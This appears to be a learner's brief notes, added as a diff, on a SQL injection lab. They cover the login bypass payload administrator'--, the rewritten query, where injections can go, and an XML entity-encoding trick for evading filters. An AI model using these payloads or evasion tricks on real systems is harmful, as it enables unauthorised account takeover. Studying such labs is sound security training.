@@ -1,0 +1,17 @@
+Task: Get administrator access by bypassing subverting application logic in the login page
+
+SQL logic in use: SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+Injection1 -- Passed
+Login: administrator'--
+Password: random123
+
+Modified SQL query: SELECT * FROM users WHERE username = 'administrator'--' AND password = 'random123'
+
+
+Where to inject sql injections:
+Query strings: login, on the URL
+In JSON, XML format (hide 'S' with '&#x53;' in XML)
+
+Questions:
+How do you know if the SQL DB is being used or not?
